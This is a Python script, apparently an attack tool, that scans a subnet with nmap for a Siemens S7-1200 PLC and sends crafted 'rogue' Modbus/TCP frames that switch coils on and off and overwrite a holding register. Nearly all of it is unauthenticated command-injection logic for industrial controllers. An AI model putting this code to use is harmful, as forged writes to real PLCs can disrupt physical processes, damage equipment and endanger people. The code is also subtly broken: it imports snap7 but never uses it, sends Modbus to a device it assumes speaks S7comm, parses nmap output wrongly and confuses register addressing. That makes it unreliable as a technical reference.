import snap7
import socket
import struct
import time
import subprocess

# Configuration
PLC_IP = None  # Will be discovered if not explicitly set
PLC_RACK = 0
PLC_SLOT = 1
ROGUE_MASTER_IP = "192.168.0.200"  # IP address of the machine running this script
ROGUE_MASTER_PORT = 502  # Example Modbus port - adjust based on your protocol

# Add your own logic to handle different protocols

# Function to discover the PLC's IP address (using nmap)
def discover_plc_ip():
    """
    Discovers the PLC's IP address by scanning the network using nmap.
    Requires nmap to be installed.  Assumes Siemens S7-1200 on standard port 102.
    """
    try:
        # Replace '192.168.1.0/24' with your network's IP range
        nmap_command = f"nmap -p 102 192.168.1.0/24"
        result = subprocess.run(nmap_command, shell=True, capture_output=True, text=True)
        output = result.stdout

        for line in output.splitlines():
            if "s7comm" in line.lower() and "open" in line.lower():
                ip_address = line.split()[0]
                print(f"PLC IP Address found: {ip_address}")
                return ip_address
        print("PLC IP Address not found.  Ensure nmap is installed and the PLC is reachable on port 102.")
        return None

    except FileNotFoundError:
        print("Error: nmap not found.  Please install nmap.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None

def craft_rogue_command(command_type, address, value):
    """
    Crafts a rogue command based on the command type, address, and value.
    This function needs to be customized based on the specific protocol
    used by the Siemens S7-1200 PLC.  This example implements Modbus function codes.
    """
    # This is a simplified example for Modbus.  Adapt it to your PLC protocol.
    if command_type == "write_single_coil":
        # Function code 0x05 (Write Single Coil)
        function_code = b'\x05'
        coil_address = struct.pack('>H', address)  # Address (big-endian unsigned short)
        coil_value = b'\xff\x00' if value else b'\x00\x00' # ON or OFF

        pdu = function_code + coil_address + coil_value
        transaction_id = struct.pack('>H', 1) # Dummy transaction ID
        protocol_id = b'\x00\x00' # Modbus protocol ID
        length = struct.pack('>H', len(pdu) + 1) # Length of PDU + Unit ID

        adu = transaction_id + protocol_id + length + b'\x01' + pdu # Unit ID is typically 1

        return adu

    elif command_type == "write_single_register":
         # Function code 0x06 (Write Single Register)
        function_code = b'\x06'
        register_address = struct.pack('>H', address)  # Address (big-endian unsigned short)
        register_value = struct.pack('>H', value) # Value to write

        pdu = function_code + register_address + register_value
        transaction_id = struct.pack('>H', 1) # Dummy transaction ID
        protocol_id = b'\x00\x00' # Modbus protocol ID
        length = struct.pack('>H', len(pdu) + 1) # Length of PDU + Unit ID

        adu = transaction_id + protocol_id + length + b'\x01' + pdu # Unit ID is typically 1
        return adu
    else:
        print("Unsupported command type.")
        return None

def send_rogue_command(plc_ip, command):
    """
    Sends the crafted rogue command to the PLC.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, ROGUE_MASTER_PORT)) # Connect to PLC's Modbus port

        sock.sendall(command)
        print(f"Rogue command sent to {plc_ip}")

        # Optionally receive and handle the response from the PLC.  Important for Modbus.
        response = sock.recv(1024)
        print(f"Response from PLC: {response}")

        sock.close()

    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"Error sending rogue command: {e}")

def main():
    global PLC_IP

    # Discover PLC IP if not set
    if PLC_IP is None:
        PLC_IP = discover_plc_ip()
        if PLC_IP is None:
            print("Failed to discover PLC IP address. Exiting.")
            return

    # Example usage:  Sending commands to the PLC

    # Example 1: Turn on Coil 10 (address 9)
    rogue_command_1 = craft_rogue_command("write_single_coil", 9, True)
    if rogue_command_1:
        send_rogue_command(PLC_IP, rogue_command_1)

    time.sleep(1) # Wait a bit

    # Example 2:  Turn off Coil 10 (address 9)
    rogue_command_2 = craft_rogue_command("write_single_coil", 9, False)
    if rogue_command_2:
        send_rogue_command(PLC_IP, rogue_command_2)

    time.sleep(1)

    # Example 3: Write the value 1234 to register 40001 (address 40000 -1 in Modbus)
    rogue_command_3 = craft_rogue_command("write_single_register", 40000, 1234)
    if rogue_command_3:
        send_rogue_command(PLC_IP, rogue_command_3)


if __name__ == "__main__":
    main()